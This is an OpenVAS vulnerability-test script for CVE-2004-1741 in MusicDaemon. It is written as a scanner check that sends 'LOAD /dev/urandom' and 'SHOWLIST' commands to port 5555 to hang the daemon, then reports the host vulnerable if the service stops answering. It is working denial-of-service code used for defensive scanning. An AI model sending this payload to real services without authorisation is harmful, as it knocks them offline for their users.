# OpenVAS Vulnerability Test
# $Id: musicd_dos.nasl 8023 2017-12-07 08:36:26Z teissa $
# Description: Music Daemon Denial of Service
#
# Authors:
# Noam Rathaus
#
# Copyright:
# Copyright (C) 2004 Noam Rathaus
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2,
# as published by the Free Software Foundation
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
#

tag_summary = "The remote host is running MusicDaemon, a music player running as a server.

It is possible to cause the Music Daemon to stop responding to 
requests by causing it to load the /dev/random filename as its track list.

An attacker can cause the product to no longer respond to requests.";

tag_solution = "None at this time";

# From: "cyber talon" <cyber_talon@hotmail.com>
# Subject: MusicDaemon <= 0.0.3 Remote /etc/shadow Stealer / DoS
# Date: 23.8.2004 17:36

if(description)
{
 script_id(14353);  
 script_version("$Revision: 8023 $");
 script_tag(name:"last_modification", value:"$Date: 2017-12-07 09:36:26 +0100 (Thu, 07 Dec 2017) $");
 script_tag(name:"creation_date", value:"2005-11-03 14:08:04 +0100 (Thu, 03 Nov 2005)");
 script_cve_id("CVE-2004-1741");
 script_bugtraq_id(11006);
 script_tag(name:"cvss_base", value:"5.0");
 script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:N/I:N/A:P");

 name = "Music Daemon Denial of Service";
 script_name(name);
 

 
 script_category(ACT_KILL_HOST);
  script_tag(name:"qod_type", value:"remote_vul");
 
 script_copyright("This script is Copyright (C) 2004 Noam Rathaus");
 
 family = "Remote file access";
 script_family(family);
 
 script_dependencies("find_service2.nasl");
 script_require_ports("Services/musicdaemon", 5555);
 script_tag(name : "solution" , value : tag_solution);
 script_tag(name : "summary" , value : tag_summary);
 exit(0);
}


port = get_kb_item("Services/musicdaemon");
if(!port)port = 5555;

if (  ! get_port_state(port) ) exit(0);

# open a TCP connection
soc = open_sock_tcp(port);
if(!soc) exit(0);

recv = recv_line(socket:soc, length: 1024);
if ("Hello" >< recv)
{
 data = string("LOAD /dev/urandom\r\n");
 send(socket:soc, data: data);

 data = string("SHOWLIST\r\n");
 send(socket:soc, data: data);

 close(soc);
 sleep(5);

 soc = open_sock_tcp(port);
 if(!soc) { security_message(port:port); exit(0); }
 
 recv = recv_line(socket:soc, length: 1024, timeout: 1);

 if ("Hello" >!< recv) security_message(port:port);
}
